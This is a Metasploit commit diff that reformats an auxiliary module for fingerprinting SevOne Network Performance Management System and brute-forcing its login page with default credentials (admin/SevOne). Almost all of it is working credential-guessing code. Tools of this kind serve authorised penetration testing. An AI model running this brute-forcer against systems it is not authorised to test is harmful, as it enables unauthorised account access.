74bddcf339b75d51b8b17f641974a3537a41d2bc
Karn Ganeshen <KarnGaneshen@gmail.com>
2013-06-08 02:28:09 +0530

    Update sevone_enum.rb
    New updates as per review comments

--- modules/auxiliary/scanner/http/sevone_enum.rb
+++ modules/auxiliary/scanner/http/sevone_enum.rb
@@ -10,106 +10,102 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Report
-  include Msf::Auxiliary::AuthBrute
-  include Msf::Auxiliary::Scanner
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::AuthBrute
+	include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'SevOne Network Performance Management System Application Version Enumeration and Brute Force Login Utility',
-      'Description'    => %{
-        This module scans for SevOne Network Performance Management System Application, finds its version,
-        and performs login brute force to identify valid credentials.},
-      'Author'         =>
-        [
-          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-        ],
-      'Version'        => '1.0',
-      'DisclosureDate' => 'June 07, 2013',
-      'License'        => MSF_LICENSE
-    ))
-    register_options(
-      [
-        Opt::RPORT(8443),
-        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
-        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne']),
-        OptString.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', true])
-      ], self.class)
-  end
+	def initialize(info={})
+		super(update_info(info,
+			'Name'	=> 'SevOne Network Performance Management Application Brute Force Login Utility',
+			'Description'    => %{
+				This module scans for SevOne Network Performance Management System Application, finds its version,
+				and performs login brute force to identify valid credentials.},
+			'Author'         =>
+				[
+					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
+				],
+			'DisclosureDate' => 'June 07, 2013',
+			'License'        => MSF_LICENSE
+		))
+	register_options(
+		[
+			Opt::RPORT(8443),
+			OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
+			OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne']),
+			OptString.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', true])
+		], self.class)
+	end
 
-  def run_host(ip)
-    if not is_app_sevone?
-      print_error("Application does not appear to be SevOne. Module will not continue.")
-      return
-    end
+	def run_host(ip)
+		unless is_app_sevone?
+			print_error("Application does not appear to be SevOne. Module will not continue.")
+		return
+		end
 
-    print_status("Starting login brute force...")
-    each_user_pass do |user, pass|
-      do_login(user, pass)
-    end
-  end
+		print_status("Starting login brute force...")
+		each_user_pass do |user, pass|
+			do_login(user, pass)
+		end
+	end
 
-  #
-  # What's the point of running this module if the app actually isn't SevOne?
-  #
-  def is_app_sevone?
+	#
+	# What's the point of running this module if the app actually isn't SevOne?
+	#
+	def is_app_sevone?
+		res = send_request_cgi(
+		{
+			'uri'       => '/doms/about/index.php',
+			'method'    => 'GET'
+		})
 
-      res = send_request_cgi(
-                        {
-                                'uri'       => '/doms/about/index.php',
-                                'method'    => 'GET'
-                        })
+		if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
+			version_key = /Version: <strong>(.+)<\/strong>/
+			version = res.body.scan(version_key).flatten
+			print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
+			success = true
+		end
+	end
 
-# should include version number
+	#
+	# Brute-force the login page
+	#
+	def do_login(user, pass)
+		vprint_status("Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
+		begin
+			res = send_request_cgi(
+			{
+				'uri'       => "/doms/login/processLogin.php?login=#{user}&passwd=#{pass}&tzOffset=-25200&tzString=Thur+May+05+1983+05:05:00+GMT+0700+",
+				'method'    => 'GET'
+			})
 
-      if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
-        version_key = /Version: <strong>(.+)<\/strong>/
-        version = res.body.scan(version_key).flatten
-        print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
-        success = true
-      end
-  end
+		check_key = "The user has logged in successfully."
 
-  #
-  # Brute-force the login page
-  #
-  def do_login(user, pass)
-    vprint_status("Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
-    begin
-      res = send_request_cgi(
-      {
-        'uri'       => "/doms/login/processLogin.php?login=#{user}&passwd=#{pass}&tzOffset=-25200&tzString=Thur+May+05+1983+05:05:00+GMT+0700+",
-        'method'    => 'GET'
-      })
+		key = JSON.parse(res.body)["statusString"]
 
-      check_key = "The user has logged in successfully."
+		if (not res or key != "#{check_key}")
+			vprint_error("FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
+			return :skip_pass
+		else
+			print_good("SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
 
-      key = JSON.parse(res.body)["statusString"]
+			report_hash = {
+				:host   => datastore['RHOST'],
+				:port   => datastore['RPORT'],
+				:sname  => 'SevOne Network Performance Management System Application',
+				:user   => user,
+				:pass   => pass,
+				:active => true,
+				:type   => 'password'}
 
-      if (not res or key != "#{check_key}")
-        vprint_error("FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
-        return :skip_pass
-      else
-        print_good("SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
+			report_auth_info(report_hash)
+			return :next_user
+		end
 
-        report_hash = {
-          :host   => datastore['RHOST'],
-          :port   => datastore['RPORT'],
-          :sname  => 'SevOne Network Performance Management System Application',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type   => 'password'}
-
-        report_auth_info(report_hash)
-        return :next_user
-      end
-
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-  	      	res = false
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+			res = false
 			print_error("HTTP Connection Failed, Aborting")
 			return :abort
 		end
-  end
+	end
 end
